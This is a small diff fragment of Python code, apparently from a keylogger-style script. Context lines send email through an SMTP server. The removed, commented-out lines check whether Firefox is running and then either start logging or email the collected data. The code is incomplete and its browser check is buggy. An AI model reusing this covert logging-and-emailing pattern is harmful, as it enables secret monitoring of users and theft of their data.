@@ -49,15 +49,3 @@ SUBJECT: %s
     server.login(user, password)
     server.sendmail(FROM, TO, message)
     server.close()
-##send_email()
-##def is_browser_running():
-##    if (os.system('tasklist | find "firefox.exe"'))==0:
-##        return true
-##    else:
-##        return false
-##if (is_browser_running):
-##    start_logging()
-##else:
-##    send_email()
-##    
-##
